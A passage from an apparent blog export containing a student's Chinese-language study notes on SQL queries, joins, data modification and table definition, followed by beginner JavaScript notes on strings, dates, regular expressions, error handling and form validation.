SELECT ename,sal FROM emp WHERE sal&gt;(SELECT min(sal) FROM emp);
from子句中的子查询from后面的子查询，可以将子查询的查询结果当作一张临时表（技巧）
例子：找出每个岗位的平均工资的薪资等级
SELECT
t,s.grade
from
(select job,avg(sal) avgsal from emp group by job) t
join
salgrade s
on
t.avgsal between s.losal and s.hisal;
select后的子查询了解了解就好
注意：对于select后面的子查询来说，这个子查询只能一次返回一条结果，多余一条就会报错
投影查询如果我们只希望返回某些列的数据，而不是所有列的数据，我们可以用SELECT 列1, 列2, 列3 FROM …，让结果集仅包含指定列。这种操作称为投影查询。（例：SELECT id，name,score FROM students;)
使用SELECT 列1, 列2, 列3 FROM …时，还可以给每一列起个别名，这样，结果集的列名就可以与原表的列名不同。它的语法是SELECT 列1 别名1, 列2 别名2, 列3 别名3 FROM …
投影查询同样可以接WHERE条件，实现复杂的查询
总的应用一下：SELECT id, score points, name FROM students WHERE gender = &#39;M&#39;;
排序如果要按我们自己的排序而不是按主键排序则加上ORDER语句
SELECT id, name, gender, score FROM students ORDER BY score;
如果要反过来，按照成绩从高到底排序，我们可以加上DESC表示“倒序”（DESC加在score后面），如果score列有相同的数据那么可以继续添加列名
如果有WHERE子句，那么ORDER BY子句要放到WHERE子句后面
SELECT id, name, gender, score FROM students WHERE class_id = 1 ORDER BY score DESC;（多个字段排序字段之间加’,’  ，前面起主导作用）
分页查询使用SELECT查询时，如果结果集数据量很大，比如几万行数据，放在一个页面显示的话数据量太大，不如分页显示，每次显示100条。
要实现分页功能，实际上就是从结果集中显示第1100条记录作为第1页，显示第101200条记录作为第2页，以此类推。
语句：LIMIT &lt;N-M&gt; OFFSET &lt;M&gt;（表示为每页最多显示几个数据）
例子：SELECT id, name, gender, score           FROM students           ORDER BY score DESC           LIMIT 3 OFFSET 0;
LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始。
如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3。
注意：OFFSET是可选的，如果只写LIMIT 15，那么相当于LIMIT 15 OFFSET 0；
​            在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15；
​           OFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集。
聚合查询对于统计总数、平均数这类计算，SQL提供了专门的聚合函数，使用聚合函数进行查询，就是聚合查询
查询一个表中一共有多少条记录可以用COUNT()函数（SELECT COUNT(*) FROM students;）
使用聚合查询时，我们应该给列名设置一个别名，便于处理结果（SELECT COUNT(*) num FROM students;）
count(*)与count(具体字段)的区别：前一个统计总行数，后一个统计该字段下所有不为NULL的元素总和
聚合查询同样可以使用WHERE条件

其他聚合函数

AVG：SELECT AVG(score) average FROM students WHERE gender = &#39;M&#39;;
注意：聚合函数自动忽略NULL
​			聚合函数不能直接用在WHERE子句中，因为聚合函数在使用时必须先分组才能使用
如果聚合查询的WHERE条件没有匹配到任何行，COUNT()会返回0，而SUM()、AVG()、MAX()和MIN()会返回NULL
每页3条记录，如何通过聚合查询获得总页数：SELECT CEILING(COUNT(*) &#x2F; 3) FROM students;
多表查询语法：：SELECT * FROM &lt;表1&gt;， &lt;表2&gt;
这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积
上述查询的结果集有两列id和两列name，两列id是因为其中一列是students表的id，而另一列是classes表的id，但是在结果集中，不好区分。两列name同理；要解决这个问题，我们仍然可以利用投影查询的“设置列的别名”来给两个表各自的id和name列起别名
例子：
`SELECT`    `students.id sid,`       多表查询时，要使用**表名.列名**这样的方式来引用列和设置别名，这样就避免了结果集的列名重复问题     `students.name,`    `students.gender,`    `students.score,`    `classes.id cid,`    `classes.name cname``FROM students, classes;`

FROM子句给表设置别名的语法是FROM &lt;表名1&gt;  &lt;别名1&gt;, &lt;表名2&gt;  &lt;别名2&gt;（使得投影查询更加的简洁）
连接查询连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。
笛卡尔积现象：当两张表进行连接查询且没有任何条件限制的时候，最终的查询条数是两张表条数的乘积
内连接——INNER JOIN查询写法：1、先确定主表，仍然使用FROM &lt;表1&gt;的语法；                   2、再确定需要连接的表，使用INNER JOIN &lt;表2&gt;的语法；                   3、 然后确定连接条件，使用ON &lt;条件…&gt;，这里的条件是s.class_id = c.id，表示students表的class_id列                                                            与                       classes表的id列相同的行需要连接；                   4、可选：加上WHERE子句、ORDER BY等子句。
等值连接：
SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sINNER JOIN classes cON s.class_id = c.id;

INNER JOIN只返回同时存在于两张表的行数据，由于students表的class_id包含1，2，3，classes表的id包含1，2，3，4，所以，INNER JOIN根据条件s.class_id &#x3D; c.id返回的结果集仅包含1，2，3。
非等值连接：条件不是一个等量关系
例子：员工工资在这个工资范围内
SELECTe.ename,e.sal,s.gradeFROMemp eINNER JOINsalgrade sONe.sal between s.losal and s.hisal;

自连接：一个表里面自己对应，技巧是一张表看成两张表
例子：找出员工及对应的领导
 SELECT     -&gt; a.ename yuangong,b.ename leader     -&gt; FROM     -&gt; emp a     -&gt; INNER JOIN     -&gt; emp b     -&gt; ON     -&gt; a.mgr=b.empno;（员工领导编号等于员工编号）
外连接–OUTER JOIN右外连接：RIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段。
左外连接：LEFT OUTER JOIN则返回左表都存在的行。
FULL OUTER JOIN，它会把两张表的所有记录全部选择出来，并且，自动把对方不存在的列填充为NULL。
例子：SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sRIGHT OUTER JOIN classes c（outer可以省略）ON s.class_id = c.id;

多个表进行连接select.....
from a 
join b 
on a和b的连接条件 
join c 
on a和c的连接条件 
join d
on a和d的连接条件 
一条SQL中内连接和外连接可以混合
DISTINCT作用：查询结果去除重复记录，但原表记录不会被修改
基础语法：SELECT DISTINCT 字段 FROM &lt;表名&gt;;
DINSTINCT只能出现在所有字段的最前方
例子：SELECT DISTINCT job,number FROM &lt;表名&gt;;表示job,number两个同时去重
分组查询select…from…where…group by…order by…执行顺序是from,where,group by,select,order by
分组语句：GROUP BY(例：SELECT COUNT(*) num FROM students GROUP BY class_id;)
​                   也可以使用多个列进行分组
​                  （SELECT class_id, gender, COUNT(*) num FROM students GROUP BY class_id, gender;）
（注意：在一条select语句当中，如果有grorup by语句的话，select后面只能跟参加分组的字段，以后分组函数，其他的一律不能跟。
例子：SELECT deptno,max(sal) from emp group by deptno;）
使用having可以对分完组之后的数据进一步过滤，其必须和group by一起用
例子：找出每个部门最高薪资并且要求显示最高薪资大于3000的数据
SELECT deptno,max(sal) FROM emp group by deptno having max(sal)&gt;3000;
WHERE实在没办法了再用having
(例子：找出每个部门的平均薪资，要求显示平均薪资高于2500的)
修改数据INSERT当我们需要向数据库表中插入一条新记录时，就必须使用INSERT语句。
语法：INSERT INTO &lt;表名&gt; (字段1, 字段2, …) VALUES (值1, 值2, …);
例子：我们向students表插入一条新记录，先列举出需要插入的字段名称，然后在VALUES子句中依次写出对应字段的值
​          INSERT INTO students (class_id, name, gender, score) VALUES (2, &#39;大牛&#39;, &#39;M&#39;, 80);
可以一次性添加多条记录，只需要在VALUES子句中指定多个记录值，每个记录是由**(…)**包含的一组值，中间用 ， 隔开
UPDATE语法：UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;
例子：UPDATE students SET name=&#39;大牛&#39;, score=66 WHERE id=1;（WHERE后面是需要更新的行的筛选条件）
UPDATE语句的WHERE条件和SELECT语句的WHERE条件其实是一样的，因此完全可以一次更新多条记录
在UPDATE语句中，更新字段时可以使用表达式
例子：UPDATE students SET score=score+10 WHERE score&lt;80;
注意如果WHERE条件没有匹配到任何记录，UPDATE语句不会报错，也不会有任何记录被更新
要特别小心的是，UPDATE语句可以没有WHERE条件，这个时候整个表的数据都会被更新！！！
DELETE基本语法：DELETE FROM &lt;表名&gt; WHERE ...;
DELETE语句也可以一次删除多条记录（例：DELETE FROM students WHERE id&gt;=5 AND id&lt;=7;）
与UPDATE语句类似WHERE条件没有匹配到任何记录，DELETE语句不会报错，也不会有任何记录被删除
和UPDATE类似，不带WHERE条件的DELETE语句会删除整个表的数据
在执行DELETE语句时也要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用DELETE删除。
数据处理函数又被称为单行处理函数，特点是一个输入对应一个输出
LOWER（转换成小写）语法：SELECT LOWER(字段) FROM &lt;表名&gt;;
UPPER转化成大写；语法：SELECT UPPER(字段) FROM &lt;表名&gt;;
SUBSTR取字符串;基本语法：SUBSTR(截取的字符串,起始下标,截取的长度)（注意：起始下标从1开始）
例子：SELECT SUBSTR(name,1,1) ename from students;
例子：SELECT  ename from emp where SUBSTR(ename,1,1)=&#39;A&#39;;(找出第一个字母是A的人)
LENGTH取长度；语法：SELECT LENGTH(字段) FROM &lt;表名&gt;;
例子：SELECT LENGTH(name) namelength FROM students;
TRIM去除前后空白
例子：SELECT * FROM emp WHERE ename=TRIM(&#39; King&#39;);（可以试试去除这个函数会发生什么）
ROUND四舍五入；例子：SELECT round(1234.567,0) result FROM emp;(0表示保留到整数位；-1表示保留到十位数)
RAND表示生成随机数：SELECT RAND() FROM emp;  例子： SELECT ROUND(RAND()*100,0) FROM emp;（100以内随机数）
IFNULL可以将NULL转换成一个具体值；基础语法：INFULL(数据,被当作哪个值);
所有数据库中有NULL参与的数学运算最后结果都为NULL，为避免这个现象需要使用IFNULL函数
例子：计算每个员工的年薪： SELECT ename,(sal+IFNULL(comm,0))*12 as yearsal from emp;
​            (试试去掉IFNULL函数会发生什么)
CASE..WHEN..THEN..WHEN..THEN..ELSE..END不会修改数据库
例子：当员工为MANAGER的时候工资上调10%，当员工为SALESMAN的时候工资上调50%
 SELECT     -&gt; ename,     -&gt; job,     -&gt; (case job when&#39;MANAGER&#39; then sal*1.1 when &#39;SALESMAN&#39; then sal*1.5 else sal end) newsal     -&gt; from emp;  
表格相关内容创建表格的通用语法：CREATE TABLE &lt;表名&gt;(
列名1 数据类型2，
列名2 数据类型2，
……
列名n 数据类型n
);
数据库类型：                    1. int：整数类型                           age int,                                        2. double:小数类型                           score double(5,2)                                                            3. date:日期，只包含年月日，yyyy-MM-dd                                                                                4. datetime:日期，包含年月日时分秒     yyyy-MM-dd HH:mm:ss                                                                                5. timestamp:时间错类型    包含年月日时分秒     yyyy-MM-dd HH:mm:ss                         如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值
                6. varchar：字符串
                       name varchar(20):姓名最大20个字符
                       zhangsan 8个字符  张三 2个字符

例子：create table student(           id int,           name varchar(32),           age int ,           score double(4,1),           birthday date,           insert_time timestamp           );
复制表：CREATE table 表名 like 被复制的表名；
查询某个数据库中所有的表名称： show tables;    查询表结构：desc 表名;
修改
修改表名         alter table 表名 rename to 新的表名;     2. 修改表的字符集         alter table 表名 character set 字符集名称;     3. 添加一列         alter table 表名 add 列名 数据类型;     4. 修改列名称 类型         alter table 表名 change 列名 新列别 新数据类型;         alter table 表名 modify 列名 新数据类型;     5. 删除列         alter table 表名 drop 列名;

删除语法：drop table 表名；
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>JvaScript笔记</title>
    <url>/2024/01/20/JavaScript_max/JvaScript%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[文中代码若无特别说明那么都是写在内的
基础初识JavaScript 可以通过不同的方式来输出数据：

使用 window.alert() 弹出警告框来显示数据。
使用 document.write() 方法将内容写到 HTML 文档中。
使用 innerHTML 写入到 HTML 元素。
使用 console.log() 写入到浏览器的控制台。

如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。
请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：
&lt;script&gt;document.getElementById(&quot;demo&quot;).innerHTML = &quot;段落已修改。&quot;;&lt;/script&gt;

JavaScript 使用关键字 var 来定义变量， 使用等号来为变量赋值 var length;
变量的数据类型可以使用 typeof 操作符来查看
可以在字符串中使用引号，只要不匹配包围字符串的引号即可
单行注释：//后面接内容
多行注释以 &#x2F;* 开始，以 ***&#x2F;** 结尾。
注释用于阻止其中一条代码行的执行（可用于调试）



break
用于跳出循环。



catch
语句块，在 try 语句块执行出错时执行 catch 语句块。


continue
跳过循环中的一个迭代。


do … while
执行一个语句块，在条件语句为 true 时继续执行该语句块。


for
在条件语句为 true 时，可以将代码块执行指定的次数。


for … in
用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。


function
定义一个函数


if … else
用于基于不同的条件来执行不同的动作。


return
退出函数


switch
用于基于不同的条件来执行不同的动作。


throw
抛出（生成）错误 。


try
实现错误处理，与 catch 一同使用。


var
声明一个变量。


while
当条件语句为 true 时，执行语句块。


代码将修改自身元素的内容 (使用 this.innerHTML):
&lt;button onclick=&quot;this.innerHTML=Date()&quot;&gt;现在的时间是?&lt;/button&gt;

对象
对象属性有两种寻址方式
&lt;script&gt;var person=&#123;	firstname : &quot;John&quot;,	lastname  : &quot;Doe&quot;,	id        :  5566&#125;;document.write(person.lastname + &quot;&lt;br&gt;&quot;);document.write(person[&quot;lastname&quot;] + &quot;&lt;br&gt;&quot;);&lt;/script&gt;

Undefined 这个值表示变量不含有值。
可以通过将变量的值设置为 null 来清空变量
当您声明新变量时，可以使用关键词 “new” 来声明其类型 var carname=new String;
作用域在 JavaScript 中, 对象和函数同样也是变量。
在 JavaScript 中, 作用域为可访问变量，对象，函数的集合。
JavaScript 函数作用域: 作用域在函数内修改。
局部作用域
变量在函数内声明，变量为局部变量，具有局部作用域。
局部变量：只能在函数内部访问。
局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁。
全局变量
变量在函数外定义，即为全局变量。
全局变量有 全局作用域: 网页中所有脚本和函数均可使用。 
如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量。
// 此处可调用 carName 变量function myFunction() &#123;    carName = &quot;Volvo&quot;;    // 此处可调用 carName 变量&#125;

事件常见的HTML事件的列表：



事件
描述



onchange
HTML 元素改变


onclick
用户点击 HTML 元素


onmouseover
鼠标指针移动到指定的元素上时发生


onmouseout
用户从一个 HTML 元素上移开鼠标时发生


onkeydown
用户按下键盘按键


onload
浏览器已完成页面的加载


字符串可以使用内置属性 length 来计算字符串的长度
**match()**函数用来查找字符串中特定的字符，并且如果找到的话，则返回这个字符：document.write(str.match(&quot;world!&quot;));
replace() 方法在字符串中用某些字符替换另一些字符：var txt = str.replace(&quot;Microsoft&quot;,&quot;Runoob&quot;);
在 JavaScript 中，字符串写在单引号或双引号中。
因为这样，以下实例 JavaScript 无法解析：&quot;We are the so-called &quot;Vikings&quot; from the north.&quot;
字符串 “We are the so-called “ 被截断。
如何解决以上的问题呢？可以使用反斜杠 () 来转义 “Vikings” 字符串中的双引号，如下:
 &quot;We are the so-called \&quot;Vikings\&quot; from the north.&quot;
 反斜杠是一个转义字符。 转义字符将特殊字符转换为字符串字符



&#39;
单引号



&quot;
双引号


\
反斜杠


\n
换行


\r
回车


\t
tab(制表符)


\b
退格符


\f
换页符


模板字符串
JavaScript 中的模板字符串是一种方便的字符串语法，允许你在字符串中嵌入表达式和变量。
模板字符串使用反引号 &#96;&#96; 作为字符串的定界符分隔的字面量。
模板字面量是用反引号（**&#96;**）分隔的字面量，允许多行字符串、带嵌入表达式的字符串插值和一种叫带标签的模板的特殊结构。
语法
`string text``string text line 1 string text line 2``string text $&#123;expression&#125; string text`tagFunction`string text $&#123;expression&#125; string text`

参数

string text：将成为模板字面量的一部分的字符串文本。几乎允许所有字符，包括换行符和其他空白字符。但是，除非使用了标签函数，否则无效的转义序列将导致语法错误。
expression：要插入当前位置的表达式，其值被转换为字符串或传递给 tagFunction。
tagFunction：如果指定，将使用模板字符串数组和替换表达式调用它，返回值将成为模板字面量的值。

&lt;script&gt;  let text=`Nice!`;  document.getElementById(&quot;demo&quot;).innerHTML=text;&lt;/script&gt;

（注意：变量名前面最好是 let或者 const）
模板字符串支持同时使用单引号和双引号；支持多行文本而无需转义字符
若要转义模板字面量中的反引号（**&#96;），需在反引号之前加一个反斜杠（**）。
`\`` === &quot;`&quot;; // true

模板字面量用反引号（**&#96;）括起来，而不是双引号（“）或单引号（‘**）。
除了普通字符串外，模板字面量还可以包含占位符——一种由美元符号和大括号分隔的嵌入式表达式：**${expression}**。
字符串和占位符被传递给一个函数（要么是默认函数，要么是自定义函数）。默认函数（当未提供自定义函数时）只执行字符串插值来替换占位符，然后将这些部分拼接到一个字符串中。
模板字符串中允许我们使用变量
&lt;script&gt;const name = &#x27;Runoob&#x27;;const age = 30;const message = `My name is $&#123;name&#125; and I&#x27;m $&#123;age&#125; years old.`;document.getElementById(&quot;demo&quot;).innerHTML = message;&lt;/script&gt;

模板字符串中允许我们使用表达式
let price = 10;let VAT = 0.25;let total = `Total: $&#123;(price * (1 + VAT)).toFixed(2)&#125;`;

模板字符串当作 HTML 模板使用
let header = &quot;&quot;;let tags = [&quot;RUNOOB&quot;, &quot;GOOGLE&quot;, &quot;TAOBAO&quot;];let html = `&lt;h2&gt;$&#123;header&#125;&lt;/h2&gt;&lt;ul&gt;`;for (const x of tags) &#123;  html += `&lt;li&gt;$&#123;x&#125;&lt;/li&gt;`;&#125;html += `&lt;/ul&gt;`;

Date()对象创建日期
参数大多数都是可选的，在不指定的情况下，默认参数是0。
new Date();  var today = new Date()new Date(value); var d1 = new Date(&quot;October 13, 1975 11:13:00&quot;)new Date(dateString); var d2 = new Date(79,5,24)new Date(year, monthIndex [, day [, hours [, minutes [, seconds [, milliseconds]]]]]);var d3 = new Date(79,5,24,11,33,0)

设置日期
下面例子是设定一个特定的日期
var myDate=new Date();myDate.setFullYear(2010,0,14);// 第二个参数为月份， 0 到 11 之间的整数值，表示从一月到十二月

这个例子是设成五天后的日期
var myDate=new Date();myDate.setDate(myDate.getDate()+5);

如果增加天数会改变月份或者年份，那么日期对象会自动完成这种转换。
For&#x2F;In循环遍历对象的属性：
&lt;script&gt;function myFunction()&#123;	var x;	var txt=&quot;&quot;;	var person=&#123;fname:&quot;Bill&quot;,lname:&quot;Gates&quot;,age:56&#125;; 	for (x in person)&#123;		txt=txt + person[x];	&#125;	document.getElementById(&quot;demo&quot;).innerHTML=txt;&#125;&lt;/script&gt;

JavaScript 标签与 break 和 continue 一起使用的理解如需标记 JavaScript 语句，请在语句之前加上冒号：lable:
break 和 continue 语句仅仅是能够跳出代码块的语句。语法如下：
break labelname;continue labelname;

break 的作用是跳出代码块, 所以 break 可以使用于循环和 switch 等
continue 的作用是进入下一个迭代, 所以 continue 只能用于循环的代码块。
代码块: 基本上是｛｝大括号之间
然后：

默认标签的情况（除了默认标签情况，其他时候必须要有名标签，否则会有惊喜）

当 break 和 continue 同时用于循环时，没有加标签，此时默认标签为当前”循环”的代码块。
当 break 用于 switch 时，默认标签为当前的 switch 代码块:
有名标签的情况
cars=[&quot;BMW&quot;,&quot;Volvo&quot;,&quot;Saab&quot;,&quot;Ford&quot;];list:&#123;    document.write(cars[0] + &quot;&quot;);    document.write(cars[1] + &quot;&quot;);    document.write(cars[2] + &quot;&quot;);    break list;    document.write(cars[3] + &quot;&quot;);    document.write(cars[4] + &quot;&quot;);    document.write(cars[5] + &quot;&quot;);&#125;

上述break list;会跳出list的代码块。如果将break换成continue会有惊喜（会报错），违反了明确中的第二点，因为list只是个普通代码块，而不是循环。除非list写成如下形式 list:
for(var i=0; i&lt;10; ++i)&#123;    continue list;&#125;

有了标签，可以使用break和continue在多层循环的时候控制外层循环。
例如下面：
outerloop:for (var i = 0; i &lt; 10; i++)&#123;    innerloop:    for (var j = 0; j &lt; 10; j++)    &#123;        if (j &gt; 3)        &#123;            break;        &#125;        if (i == 2)        &#123;            break innerloop;        &#125;        if (i == 4)        &#123;            break outerloop;        &#125;        document.write(&quot;i=&quot; + i + &quot; j=&quot; + j + &quot;&quot;);    &#125;&#125;

undefined与null null 表示 “什么都没有”，是一个只有一个值的特殊类型。表示一个空对象引用。
 undefined 是一个没有设置值的变量。typeof 一个没有值的变量会返回 undefined
typeof undefined    // undefinedtypeof null         // objectnull === undefined  // falsenull == undefined   // true

两者值相等但是类型不相等
类型转换Number() 转换为数字， String() 转换为字符串， Boolean() 转换为布尔值
6 种不同的数据类型：string，number，boolean，object，function，symbol
3 种对象类型：Object，Date，Array
2 个不包含任何值的数据类型：null，undefined
注意：使用typrof操作符不能判断是Array还是Date，因为它两返回的数据类型都是object
constructor属性
返回所有 JavaScript 变量的构造函数
&quot;John&quot;.constructor                 // 返回函数 String()  &#123; [native code] &#125;(3.14).constructor                 // 返回函数 Number()  &#123; [native code] &#125;false.constructor                  // 返回函数 Boolean() &#123; [native code] &#125;[1,2,3,4].constructor              // 返回函数 Array()   &#123; [native code] &#125;&#123;name:&#x27;John&#x27;, age:34&#125;.constructor  // 返回函数 Object()  &#123; [native code] &#125;new Date().constructor             // 返回函数 Date()    &#123; [native code] &#125;function () &#123;&#125;.constructor         // 返回函数 Function()&#123; [native code] &#125;

查看对象是否为数组的方法
第一种：使用constructor属性来判断
var fruits=[&quot;banana&quot;,&quot;orange&quot;,&#x27;apple&#x27;];document.getElementById(&quot;demo&quot;).innerHTML=checkArray(fruits);function checkArray(Array)&#123;  return Array.constructor.toString().indexOf(&quot;Array&quot;)&gt;-1;&#125;

return myArray.constructor.toString().indexOf(&quot;Array&quot;) &gt; -1;：这行代码使用 constructor 属性获取传入数组的构造函数，将其转换为字符串，并检查字符串中是否包含 “Array”。如果包含，返回 true 表示是数组，否则返回 false 表示不是数组。
第二种：使用内置函数来判断（gpt告诉我的，更为简便）
Array.isArray() 方法，它是 JavaScript 的内建方法，专门用于检查一个对象是否是数组
document.getElementById(&quot;demo&quot;).innerHTML = Array.isArray(fruits);

查看对象是否为日期的方法
第一种同上
第二种使用 instanceof 关键字可以确定一个对象是否属于特定的构造函数
var myDate = new Date();if (myDate instanceof Date) &#123;    console.log(&#x27;myDate 是一个 Date 对象&#x27;);&#125; else &#123;    console.log(&#x27;myDate 不是一个 Date 对象&#x27;);&#125;

其中的 console.log被用于输出字符串到控制台，具体取决于 myDate 对象是否是 Date 类型。如果是 Date 类型，将输出 &#39;myDate 是一个 Date 对象&#39;，否则将输出 &#39;myDate 不是一个 Date 对象&#39;。（摁F12或者直接查看开发者工具）
日期转化为字符串（还有数字，布尔值转化成字符串的方法网上都可以找到，这里就不一一列举了）



getDate()
从 Date 对象返回一个月中的某一天 (1 ~ 31)。



getDay()
从 Date 对象返回一周中的某一天 (0 ~ 6)。


getFullYear()
从 Date 对象以四位数字返回年份。


getHours()
返回 Date 对象的小时 (0 ~ 23)。


getMilliseconds()
返回 Date 对象的毫秒(0 ~ 999)。


getMinutes()
返回 Date 对象的分钟 (0 ~ 59)。


getMonth()
从 Date 对象返回月份 (0 ~ 11)。


getSeconds()
返回 Date 对象的秒数 (0 ~ 59)。


getTime()
返回 1970 年 1 月 1 日至今的毫秒数。


字符串转为数字的方法：
Number()



方法
描述



parseFloat()
解析一个字符串，并返回一个浮点数。


parseInt()
解析一个字符串，并返回一个整数。


正则表达式正则表达式是由一个字符序列形成的搜索模式，当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。
正则表达式可以是一个简单的字符，或一个更复杂的模式，可用于所有文本搜索和文本替换的操作。
语法：/正则表达式主体/修饰符(可选)

正则表达式通常用于两个字符串方法 : search() 和 replace()。
search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。
function myFunction()&#123;  var str=&quot;Visit runoob&quot;;  var n=str.search(/Runoob/i);  document.getElementById(&quot;demo&quot;).innerHTML=n;&#125;

replace() 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。
function myFunction()&#123;  var str=document.getElementById(&quot;demo&quot;).innerHTML;  var txt=str.replace(/die/i,&quot;happy&quot;);  document.getElementById(&quot;demo&quot;).innerHTML=txt;&#125;

修饰符



i
执行对大小写不敏感的匹配。



g
执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。


m
执行多行匹配。


正则表达式模式
方括号用于查找某个范围内的字符：



表达式
描述



[abc]
查找方括号之间的任何字符。


[0-9]
查找任何从 0 至 9 的数字。


(x|y)
查找任何以 | 分隔的选项。


元字符是拥有特殊含义的字符：



元字符
描述



\d
查找数字。


\s
查找空白字符。


\b
匹配单词边界。


\uxxxx
查找以十六进制数 xxxx 规定的 Unicode 字符。


量词:



量词
描述



n+
匹配任何包含至少一个 n 的字符串。


n*
匹配任何包含零个或多个 n 的字符串。


n?
匹配任何包含零个或一个 n 的字符串。


RegExp对象RegExp 对象是一个预定义了属性和方法的正则表达式对象
创建 RegExp 对象的方式

字面量表示法：使用斜杠（/）将正则表达式括起来。
javascriptCopy codevar regex = /pattern/;

构造函数表示法：使用 RegExp 构造函数创建一个 RegExp 对象。
javascriptCopy codevar regex = new RegExp(&quot;pattern&quot;);

RegExp对象的常用方法和属性

**test()**：用于检测字符串是否匹配正则表达式。如果匹配成功，则返回 true，否则返回 false。
var pattl=new RegExp(&quot;e&quot;);document.write(pattl.test(&quot;The best thing&quot;));

**exec()**：用于在字符串中执行一个搜索匹配。如果匹配成功，则返回一个结果数组；否则返回 null。
var regex = /\d+/g; // 定义一个正则表达式，用于匹配数字var str = &quot;Today is 2024-01-11, and it&#x27;s raining. The temperature is 15°C.&quot;;var match;while ((match = regex.exec(str)) !== null) &#123;  console.log(&quot;Found: &quot; + match[0] + &quot;, at index: &quot; + match.index);&#125;

source：RegExp 对象的只读属性，返回正则表达式的文本字符串。
javascriptCopy codeconsole.log(regex.source);

flags：RegExp 对象的只读属性，返回正则表达式的修饰符字符串。


console.log(regex.flags);

throw,try,catchtry 语句测试代码块的错误。
catch 语句处理错误。
throw 语句创建自定义错误。
finally 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行。
抛出(throw)错误
当错误发生时，当事情出问题时，JavaScript 引擎通常会停止，并生成一个错误消息。
描述这种情况的技术术语是：JavaScript 将抛出一个错误。
try和catch
try 语句允许我们定义在执行时进行错误测试的代码块。
catch 语句允许我们定义当 try 代码块发生错误时，所执行的代码块。
JavaScript 语句 try 和 catch 是成对出现的。
try &#123;    ...    //异常的抛出&#125; catch(e) &#123;    ...    //异常的捕获与处理&#125; finally &#123;    ...    //结束处理&#125;

实例如下：
&lt;script&gt;  var txt=&quot;&quot;;  function message()&#123;    try &#123;      adddlert(&quot;Welcome guest!&quot;);    &#125;    catch(err) &#123;      txt=&quot;本页有一个错误。\n\n&quot;;      txt+=&quot;错误描述：&quot; + err.message + &quot;\n\n&quot;;      txt+=&quot;点击确定继续。\n\n&quot;;      alert(txt);    &#125;  &#125;&lt;/script&gt;&lt;input type=&quot;button&quot; value=&quot;点击查看消息&quot; onclick=&quot;message()&quot;/&gt;

对于err.message的理解：catch 块捕获了可能发生的错误，并将错误对象存储在变量 err 中。然后，通过 err.message 属性可以获取到该错误对象的消息内容，即错误的描述信息。
与finally语句之间的联用
&lt;p&gt;不管输入是否正确，输入框都会再输入后清空。&lt;/p&gt;&lt;p&gt;请输入 5 ~ 10 之间的数字：&lt;/p&gt;&lt;input id=&quot;demo&quot; type=&quot;text&quot;&gt;&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点我&lt;/button&gt;&lt;p id=&quot;p01&quot;&gt;&lt;/p&gt;&lt;script&gt;function myFunction() &#123;  var message, x;  message = document.getElementById(&quot;p01&quot;);  message.innerHTML = &quot;&quot;;  x = document.getElementById(&quot;demo&quot;).value;  try &#123;     if(x == &quot;&quot;) throw &quot;值是空的&quot;;    if(isNaN(x)) throw &quot;值不是一个数字&quot;;    x = Number(x);    if(x &gt; 10) throw &quot;太大&quot;;    if(x &lt; 5) throw &quot;太小&quot;;  &#125;  catch(err) &#123;    message.innerHTML = &quot;错误: &quot; + err + &quot;.&quot;;  &#125;  finally &#123;    document.getElementById(&quot;demo&quot;).value = &quot;&quot;;  &#125;&#125;&lt;/script&gt;

isNaN() 是 JavaScript 中的一个内置函数，用于检查一个值是否为 “NaN”（Not-a-Number，非数字）。
表单验证HTML约束验证
HTML 约束验证基于：HTML 输入属性，CSS 伪类选择器，DOM 属性和方法
HTML 输入属性：



属性
描述



disabled
规定输入的元素不可用


max
规定输入元素的最大值


min
规定输入元素的最小值


pattern
规定输入元素值的模式


required
规定输入元素字段是必需的


type
规定输入元素的类型


必填或必选项目
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;head&gt;&lt;script&gt;function validateForm()&#123;var x=document.forms[&quot;myForm&quot;][&quot;fname&quot;].value;if (x==null || x==&quot;&quot;)&#123;  alert(&quot;姓必须填写&quot;);  return false;  &#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;myForm&quot; action=&quot;demo-form.php&quot; onsubmit=&quot;return validateForm()&quot; method=&quot;post&quot;&gt;姓: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;

